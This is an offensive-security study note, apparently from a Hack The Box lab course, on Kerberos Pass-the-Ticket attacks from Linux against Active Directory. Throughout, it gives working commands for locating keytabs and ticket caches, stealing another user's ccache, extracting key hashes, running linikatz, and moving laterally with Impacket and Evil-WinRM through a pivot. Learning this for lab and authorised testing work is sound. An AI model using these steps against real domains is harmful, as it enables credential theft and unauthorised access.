# Pass the Ticket (PtT) from Linux

## Core Concept

Linux systems can participate in Active Directory using Kerberos.

The two most important Kerberos artifacts are:

```text id="1rve79"
KEYTAB
    → long-term Kerberos keys
    → can request a TGT

CCACHE
    → cached Kerberos tickets
    → can be used directly while valid
```

Mental model:

```text id="pmo23a"
Keytab = key used to obtain a ticket

ccache = wallet containing tickets
```

---

# 1. Identify AD Integration

```bash id="m5t4sd"
realm list
```

Important output:

```text id="cyktfb"
type: kerberos
realm-name: INLANEFREIGHT.HTB
domain-name: inlanefreight.htb
configured: kerberos-member
server-software: active-directory
client-software: sssd
```

Alternative:

```bash id="3k2flw"
ps -ef | grep -Ei "sssd|winbind"
```

Common indicators:

```text id="k8w7v3"
sssd
sssd_be
sssd_nss
sssd_pam
winbindd
```

---

# 2. Find Keytabs

Search:

```bash id="qf38gk"
find / -iname "*keytab*" -ls 2>/dev/null
```

Common locations:

```text id="uu2xpu"
/etc/krb5.keytab
/opt/
/home/
/usr/local/
/application/script directories
```

Also inspect scripts and cronjobs:

```bash id="7y1f2v"
crontab -l
cat /etc/crontab
find /etc/cron* -type f -maxdepth 2 -ls 2>/dev/null
```

Search scripts for:

```text id="z0t6pr"
kinit
-k
-t
.keytab
```

Example:

```bash id="zvst4y"
grep -RniE "kinit|\.keytab|-k[[:space:]]+-t" /etc /opt /home 2>/dev/null
```

---

# 3. Inspect a Keytab

```bash id="z8q8ha"
klist -k -t /path/to/file.keytab
```

Shows:

```text id="2x7jv8"
Principal
KVNO
Timestamp
```

Example:

```text id="s9eumk"
carlos@INLANEFREIGHT.HTB
```

This tells you which identity the keytab belongs to.

---

# 4. Keytab → TGT

Use:

```bash id="b3kd4u"
kinit <PRINCIPAL> -k -t <KEYTAB>
```

Example:

```bash id="xh27e6"
kinit carlos@INLANEFREIGHT.HTB \
    -k \
    -t /opt/specialfiles/carlos.keytab
```

Concept:

```text id="qtb3ro"
Keytab
  ↓
kinit
  ↓
KDC
  ↓
TGT
  ↓
credential cache
```

No plaintext password is required when the keytab authentication succeeds.

---

# 5. View Current Kerberos Tickets

```bash id="p9g5vr"
klist
```

Useful fields:

```text id="6vfwsd"
Ticket cache
Default principal
Valid starting
Expires
Renew until
Service principal
```

TGT example:

```text id="8cb6yu"
krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
```

---

# 6. Ccache

Common location:

```text id="nt9s4p"
/tmp/krb5cc_*
```

Find them:

```bash id="n6z5l0"
find /tmp -type f -name "krb5cc_*" -ls 2>/dev/null
```

or:

```bash id="wcs6p0"
ls -la /tmp | grep krb5cc
```

Inspect a cache:

```bash id="kktp1b"
klist -c /path/to/ccache
```

---

# 7. `KRB5CCNAME`

Check:

```bash id="ncrncz"
echo "$KRB5CCNAME"
env | grep -i KRB5
```

Example:

```text id="4mjtkm"
KRB5CCNAME=FILE:/tmp/krb5cc_12345
```

This tells Kerberos-aware applications where to find the cache.

---

# 8. Use Another User's Ccache

With appropriate access:

```bash id="2jxnko"
cp /tmp/krb5cc_<USER>_* /root/user.ccache
```

Set:

```bash id="h9twg9"
export KRB5CCNAME=/root/user.ccache
```

Verify:

```bash id="dcl34n"
klist
```

Expected:

```text id="j95g4p"
Default principal: user@DOMAIN
```

Important:

```text id="s0kgt9"
Check ticket expiration before attempting authentication.
```

---

# 9. Verify Account Privileges

Domain user:

```bash id="rdx7hd"
id user@domain
```

Look for groups such as:

```text id="s6fd77"
Domain Admins
Enterprise Admins
other privileged groups
```

Mental chain:

```text id="r7v5b0"
ccache owner
    ↓
identity
    ↓
group membership
    ↓
actual access
```

---

# 10. SMB with Kerberos

```bash id="7i8wvs"
smbclient //dc01/share -k -c ls
```

Useful:

```text id="35r4pt"
-k
    use Kerberos

-no-pass
    don't prompt for password
```

Example:

```bash id="p0s2y1"
smbclient //dc01/C$ -k -no-pass
```

---

# 11. Keytab Extraction

A keytab can contain several key types.

Example extraction output:

```text id="t6hzoz"
NTLM HASH
AES-256 HASH
AES-128 HASH
```

Concept:

```text id="vmzv6g"
One principal
    ↓
multiple Kerberos encryption keys
```

A keytab extraction utility may be used to inspect this material:

```bash id="c5cm7a"
python3 keytabextract.py <keytab>
```

Potential uses:

```text id="v5ma5v"
NT hash
    → PtH

Kerberos key
    → request TGT / Kerberos authentication

Hash
    → offline password cracking where appropriate
```

---

# 12. Linux Kerberos Attack Tools

Many tools can use the current Kerberos cache.

### Impacket

```bash id="v7sb8s"
impacket-wmiexec <HOSTNAME> -k -no-pass
```

Example:

```bash id="x2j0bt"
impacket-wmiexec dc01 -k -no-pass
```

Important:

```text id="o0m96b"
-k
    Kerberos authentication

-no-pass
    don't request plaintext password
```

Prefer the target hostname rather than raw IP when Kerberos/SPN resolution matters.

---

# 13. Evil-WinRM with Kerberos

Install Kerberos client support on Debian/Kali-style systems as needed:

```bash id="m5bo5k"
sudo apt install krb5-user
```

Kerberos configuration:

```text id="fwu4s1"
/etc/krb5.conf
```

Example:

```ini id="3bml6w"
[libdefaults]
    default_realm = INLANEFREIGHT.HTB

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }
```

Then:

```bash id="7y7rji"
evil-winrm -i dc01 -r inlanefreight.htb
```

With a proxy where required:

```bash id="4ld7po"
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

---

# 14. Kerberos Through a Pivot

When your attack host cannot reach the KDC directly:

```text id="sdg6kt"
Kali
  ↓
SOCKS / Chisel
  ↓
pivot host
  ↓
DC / KDC
```

Typical supporting components:

```text id="fl88vz"
Chisel
Proxychains
/etc/hosts
/etc/krb5.conf
```

Example `/etc/hosts`:

```text id="0ewx1j"
172.16.1.10 dc01.inlanefreight.htb dc01
172.16.1.5  ms01.inlanefreight.htb ms01
```

Important:

```text id="wjyyqu"
Kerberos is highly dependent on correct
host/domain naming and KDC connectivity.
```

---

# 15. ccache → kirbi

Convert Linux ccache to Windows-style `.kirbi`:

```bash id="zcfz19"
impacket-ticketConverter input.ccache output.kirbi
```

Reverse conversion is also possible:

```text id="dtdr9w"
.kirbi → ccache
```

Purpose:

```text id="e1z1m0"
Move Kerberos ticket material between
Linux and Windows tooling.
```

---

# 16. Linikatz

Linux credential/ticket collection tool for systems integrated with AD and other identity platforms.

Run with appropriate privileges:

```bash id="vd05fk"
./linikatz.sh
```

Potential sources:

```text id="0o58ko"
SSSD
Kerberos
Samba
FreeIPA
ccache
keytabs
machine credentials
cached credentials
```

Output is generally placed in a directory beginning with:

```text id="scbb4e"
linikatz.
```

---

# 17. Keytab vs Ccache

```text id="iofnc9"
KEYTAB
    ↓
contains long-term keys
    ↓
kinit -k -t
    ↓
request TGT
```

```text id="8d7t7p"
CCACHE
    ↓
contains ticket(s)
    ↓
KRB5CCNAME
    ↓
use ticket directly
```

|                   | Keytab                               | ccache                     |
| ----------------- | ------------------------------------ | -------------------------- |
| Contains          | Long-term keys                       | Kerberos tickets           |
| Common path       | `/etc/krb5.keytab`, app locations    | `/tmp/krb5cc_*`            |
| Main command      | `kinit -k -t`                        | `klist`, `KRB5CCNAME`      |
| Can request TGT   | Yes                                  | TGT may already be present |
| Usually temporary | No                                   | Yes                        |
| Expires           | Key rotation/password changes matter | Tickets expire             |

---

# 18. Windows vs Linux Ticket Files

```text id="dq8xa0"
Windows
    ↓
.kirbi
    ↓
Rubeus / Mimikatz
```

```text id="y39hqp"
Linux
    ↓
ccache
    ↓
KRB5CCNAME / Kerberos-aware tools
```

Convert when needed:

```bash id="v95lt4"
impacket-ticketConverter <input> <output>
```

---

# 19. Full Linux PtT Workflow

```text id="5stx0d"
Linux foothold
      ↓
realm list / SSSD / winbind
      ↓
confirm AD + Kerberos
      ↓
search keytabs
      ↓
search /tmp for ccache
      ↓
identify owner
      ↓
check group membership
      ↓
check ticket validity
      ↓
       ┌───────────────┐
       │               │
     Keytab          Ccache
       │               │
     klist -k         klist
       │               │
     kinit            KRB5CCNAME
       │               │
      TGT         Existing TGT/TGS
       │               │
       └───────┬───────┘
               ↓
       Kerberos-aware tool
               ↓
        SMB / WMI / WinRM
               ↓
        Lateral movement
```

---

# Golden Rules

```text id="efoa72"
1. Linux can be an AD/Kerberos member.

2. realm list is a quick way to identify AD integration.

3. SSSD and winbind are important Linux/AD integration indicators.

4. A keytab contains long-term Kerberos keys, not ordinary password text.

5. A ccache contains Kerberos tickets.

6. Keytab → kinit → request a TGT.

7. Ccache → KRB5CCNAME → use the cached ticket.

8. /etc/krb5.keytab may contain machine-account key material.

9. Search scripts and cronjobs for keytab usage; the filename may not contain "keytab".

10. Always identify who owns a ticket and what privileges that identity has.

11. Always check Valid starting, Expires, and Renew until.

12. Kerberos usually cares about correct hostnames/SPNs, not merely IP addresses.

13. Kerberos from an external attack host may require KDC connectivity, DNS resolution, and a pivot.

14. Impacket uses -k for Kerberos authentication.

15. ccache and .kirbi are different representations of Kerberos ticket material and can be converted.

16. A stolen valid TGT can be significantly more flexible than a service-specific TGS.

17. A keytab may contain multiple encryption types for one principal.

18. Keytab read access is the important prerequisite for using the contained keys; write access is not inherently required.

19. A ticket is authentication material, not automatic authorization—the account's actual permissions still determine what you can do.
```
